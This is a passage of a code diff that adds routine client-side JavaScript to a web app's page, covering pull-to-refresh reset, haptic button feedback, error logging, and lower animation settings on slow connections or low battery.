+      
+      // Reset
+      document.body.style.transform = '';
+      startY = 0;
+      pullDistance = 0;
+    }, { passive: true });
+
+    // Add haptic feedback for supported devices
+    function addHapticFeedback(element, type = 'light') {
+      element.addEventListener('click', function() {
+        if ('vibrate' in navigator) {
+          switch(type) {
+            case 'light':
+              navigator.vibrate(10);
+              break;
+            case 'medium':
+              navigator.vibrate(20);
+              break;
+            case 'heavy':
+              navigator.vibrate(50);
+              break;
+          }
+        }
+      });
+    }
+
+    // Add haptic feedback to buttons
+    document.addEventListener('DOMContentLoaded', function() {
+      const buttons = document.querySelectorAll('.btn, .category-btn, .genre-btn');
+      buttons.forEach(button => {
+        addHapticFeedback(button, 'light');
+      });
+    });
+
     // Initialize the app
     init();
+
+    // Add visibility change handler to pause/resume when tab is not visible
+    document.addEventListener('visibilitychange', function() {
+      if (document.hidden) {
+        // Pause any ongoing operations
+        console.log('App paused');
+      } else {
+        // Resume operations
+        console.log('App resumed');
+      }
+    });
+
+    // Memory management - clean up when page is unloaded
+    window.addEventListener('beforeunload', function() {
+      // Clean up any intervals, timeouts, or event listeners
+      if (searchTimeout) {
+        clearTimeout(searchTimeout);
+      }
+      if (resizeTimeout) {
+        clearTimeout(resizeTimeout);
+      }
+    });
+
+    // Add error boundary for unhandled errors
+    window.addEventListener('error', function(e) {
+      console.error('Unhandled error:', e.error);
+      // Could send error reports to a logging service
+    });
+
+    window.addEventListener('unhandledrejection', function(e) {
+      console.error('Unhandled promise rejection:', e.reason);
+      // Could send error reports to a logging service
+    });
+
+    // Add connection quality detection
+    if ('connection' in navigator) {
+      const connection = navigator.connection;
+      
+      function updateForConnection() {
+        if (connection.effectiveType === 'slow-2g' || connection.effectiveType === '2g') {
+          // Reduce image quality, disable animations
+          document.documentElement.style.setProperty('--animation-duration', '0s');
+          console.log('Slow connection detected - optimizing experience');
+        }
+      }
+      
+      updateForConnection();
+      connection.addEventListener('change', updateForConnection);
+    }
+
+    // Add battery status optimization
+    if ('getBattery' in navigator) {
+      navigator.getBattery().then(function(battery) {
+        function updateBatteryOptimization() {
+          if (battery.level < 0.2 && !battery.charging) {
+            // Low battery - reduce animations and background processes
+            document.documentElement.style.setProperty('--animation-duration', '0s');
+            console.log('Low battery detected - optimizing for power saving');
+          }
+        }
+        
+        updateBatteryOptimization();
+        battery.addEventListener('levelchange', updateBatteryOptimization);
+        battery.addEventListener('chargingchange', updateBatteryOptimization);
+      });
+    }
   </script>
 </body>
 </html>
